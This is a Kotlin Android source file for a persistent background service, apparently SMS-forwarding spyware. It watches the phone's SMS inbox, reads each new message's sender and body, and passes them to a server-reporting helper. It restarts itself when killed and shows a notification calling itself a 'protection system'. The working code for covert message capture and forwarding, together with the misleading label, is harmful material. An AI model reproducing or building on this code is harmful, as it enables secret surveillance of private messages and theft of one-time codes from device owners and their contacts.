package com.example.informer

import android.app.NotificationChannel
import android.app.NotificationManager
import android.app.Service
import android.content.Context
import android.content.Intent
import android.content.pm.ServiceInfo
import android.database.ContentObserver
import android.net.Uri
import android.os.Build
import android.os.Handler
import android.os.IBinder
import android.os.Looper
import android.util.Log
import androidx.core.app.NotificationCompat

class BackgroundMonitoringService : Service() {

    private lateinit var smsObserver: ContentObserver
    
    private val safeContext by lazy {
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.N) createDeviceProtectedStorageContext() else this
    }
    
    private val prefs by lazy {
        safeContext.getSharedPreferences("AppInternalStateV4", Context.MODE_PRIVATE)
    }

    private var lastProcessedSmsDate: Long
        get() = prefs.getLong("last_processed_sms_date", 0L)
        set(value) {
            prefs.edit().putLong("last_processed_sms_date", value).commit()
        }

    override fun onCreate() {
        super.onCreate()
        if (lastProcessedSmsDate == 0L) {
            lastProcessedSmsDate = getMaxSmsDateInInbox()
        }
        startForegroundNow()
        registerSmsObserver()
    }

    private fun getMaxSmsDateInInbox(): Long {
        return try {
            val cursor = contentResolver.query(
                Uri.parse("content://sms/inbox"),
                arrayOf("date"), null, null, "date DESC LIMIT 1"
            )
            cursor?.use { if (it.moveToFirst()) it.getLong(0) else System.currentTimeMillis() } ?: System.currentTimeMillis()
        } catch (e: Exception) { System.currentTimeMillis() }
    }

    override fun onStartCommand(intent: Intent?, flags: Int, startId: Int): Int {
        startForegroundNow()
        return START_STICKY
    }

    override fun onDestroy() {
        try { contentResolver.unregisterContentObserver(smsObserver) } catch (e: Exception) {}
        super.onDestroy()
    }

    override fun onTaskRemoved(rootIntent: Intent?) {
        super.onTaskRemoved(rootIntent)
        val restartIntent = Intent(applicationContext, BackgroundMonitoringService::class.java)
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) startForegroundService(restartIntent)
        else startService(restartIntent)
    }

    override fun onBind(intent: Intent?): IBinder? = null

    private fun registerSmsObserver() {
        smsObserver = object : ContentObserver(Handler(Looper.getMainLooper())) {
            override fun onChange(selfChange: Boolean) {
                readNewSms()
            }
        }
        contentResolver.registerContentObserver(Uri.parse("content://sms/inbox"), true, smsObserver)
    }

    private fun readNewSms() {
        kotlin.concurrent.thread {
            try {
                // Đợi 2500ms để Receiver có cơ hội xử lý trước ổn định
                Thread.sleep(2500)
                
                val cursor = contentResolver.query(
                    Uri.parse("content://sms/inbox"),
                    arrayOf("address", "body", "date", "_id"),
                    "date > ?",
                    arrayOf(lastProcessedSmsDate.toString()),
                    "date ASC"
                )

                cursor?.use {
                    while (it.moveToNext()) {
                        val rawNumber = it.getString(0) ?: continue
                        val body      = it.getString(1) ?: continue
                        val date      = it.getLong(2)
                        val smsId     = it.getString(3) ?: ""

                        if (date <= lastProcessedSmsDate) continue
                        
                        val msgKey = "ID_$smsId"
                        if (prefs.contains(msgKey)) {
                            lastProcessedSmsDate = date
                            continue
                        }

                        val number = PhoneUtils.formatVietnamesePhoneNumber(rawNumber)
                        val cleanBody = body.replace("\\s".toRegex(), "")
                        val tsSec = date / 1000
                        val fuzzyKey = "KEY_${number}_${cleanBody}_$tsSec"
                        val fuzzyKeyPrev = "KEY_${number}_${cleanBody}_${tsSec - 1}"
                        
                        if (prefs.contains(fuzzyKey) || prefs.contains(fuzzyKeyPrev)) {
                            prefs.edit().putBoolean(msgKey, true).commit()
                            lastProcessedSmsDate = date
                            continue
                        }

                        // Ghi nhật ký và gửi bù
                        prefs.edit().putBoolean(msgKey, true).commit()
                        lastProcessedSmsDate = date
                        
                        val name = PhoneUtils.getDisplayName(applicationContext, number)
                        Log.d("SERVICE", "📩 [BACKUP] Gửi tin sót ID: $smsId")
                        ServerReporter.sendEventSync(applicationContext, "SMS", name, body, date)
                    }
                }
            } catch (e: Exception) {
                Log.e("SERVICE", "Lỗi: ${e.message}")
            }
        }
    }

    private fun startForegroundNow() {
        val channelId = "MONITOR_CHANNEL_V5"
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
            val manager = getSystemService(Context.NOTIFICATION_SERVICE) as NotificationManager
            if (manager.getNotificationChannel(channelId) == null) {
                manager.createNotificationChannel(NotificationChannel(channelId, "Hệ thống bảo vệ", NotificationManager.IMPORTANCE_LOW))
            }
        }
        val notification = NotificationCompat.Builder(this, channelId)
            .setOngoing(true)
            .setSmallIcon(android.R.drawable.ic_lock_idle_lock)
            .setContentTitle("Hệ thống bảo vệ đang chạy")
            .setContentText("Đang giám sát thiết bị...")
            .build()
        try {
            if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.UPSIDE_DOWN_CAKE) 
                startForeground(101, notification, ServiceInfo.FOREGROUND_SERVICE_TYPE_SPECIAL_USE)
            else if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.Q) 
                startForeground(101, notification, ServiceInfo.FOREGROUND_SERVICE_TYPE_DATA_SYNC)
            else startForeground(101, notification)
        } catch (e: Exception) {}
    }
}
